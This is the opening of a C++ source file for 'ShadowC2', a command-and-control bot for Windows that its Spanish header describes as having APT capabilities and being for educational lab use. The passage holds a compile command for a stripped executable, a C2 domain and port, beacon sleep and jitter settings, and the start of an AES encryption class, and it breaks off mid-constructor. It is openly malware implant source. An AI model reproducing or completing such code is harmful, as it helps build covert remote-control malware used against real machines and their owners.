/**
 * ShadowC2 - C++ Bot (Advanced)
 * Bot nativo con capacidades APT
 * Laboratorio de Ciberseguridad - Uso Educativo
 * 
 * Compilación: x86_64-w64-mingw32-g++ -o shadow_bot.exe shadow_bot.cpp -lws2_32 -lcrypt32 -s -O2
 */

#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <memory>
#include <thread>
#include <chrono>
#include <random>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")

// Configuration
#define C2_DOMAIN "shadowc2.local"
#define C2_PORT 8443
#define SLEEP_TIME 30000
#define JITTER 10000

// Encryption
class AESCrypt {
private:
    std::vector<BYTE> key;
    
public:
    AESCrypt() {
        key.resize(32);
       
